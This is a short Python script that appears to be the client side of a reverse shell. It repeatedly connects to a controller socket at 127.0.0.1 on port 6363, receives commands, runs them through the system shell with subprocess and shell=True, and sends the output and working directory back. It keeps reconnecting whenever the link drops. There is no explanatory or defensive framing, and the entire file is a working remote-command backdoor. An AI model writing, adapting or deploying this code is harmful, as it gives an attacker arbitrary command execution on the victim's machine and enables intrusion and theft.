import socket
import os
import subprocess
import time

def create_socket():
    global client_socket
    client_socket = socket.socket()

def connect_socket():
    global host
    global port
    global client_socket
    host = '127.0.0.1'
    port = 6363
    while True:
        try:
            client_socket.connect((host, port))
            break
        except ConnectionRefusedError:
            time.sleep(5)

def communicate_w_server():
    global client_socket
    while True:
        try:
            server_command = client_socket.recv(1024)
            server_command_string = server_command.decode('utf-8')
            if server_command_string[:2] == 'cd':
                os.chdir(server_command_string[3:])
            if len(server_command_string) > 0:
                command_process = subprocess.Popen(server_command_string[:], shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                command_output = command_process.stdout.read() + command_process.stderr.read()
                command_output_string = str(command_output, 'utf-8')
                current_WD = os.getcwd()
                client_socket.send(str.encode(command_output_string + current_WD))
        except socket.error:
            connect_socket()

def main():
    create_socket()
    connect_socket()
    communicate_w_server()

if __name__ == "__main__":
    main()
  
